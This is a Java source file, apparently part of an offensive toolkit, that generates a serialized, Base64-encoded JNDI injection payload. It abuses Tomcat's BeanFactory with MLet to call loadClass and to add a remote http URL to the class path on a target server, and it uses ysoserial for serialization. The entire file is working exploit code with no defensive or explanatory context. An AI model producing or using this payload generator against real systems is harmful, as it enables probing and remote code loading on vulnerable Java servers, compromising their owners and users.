package com.bloom.payload;

import com.bloom.util.Fuzz;
import com.unboundid.util.Base64;
import org.apache.naming.ResourceRef;
import ysoserial.Serializer;

import javax.naming.StringRefAddr;
import java.io.IOException;

public class MletFuzz {

    public static String Fuzzpayload(String Clazz,String url) throws IOException {
        String loadClass= Fuzz.Fuzzmap.get(Clazz);
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", loadClass));
        ref.add(new StringRefAddr("b", "http://"+url+"/"));
        ref.add(new StringRefAddr("c", Clazz));
        System.out.println("Fuzz的class："+loadClass);
        String s = Base64.encode(Serializer.serialize(ref));
        return s;
    }

}
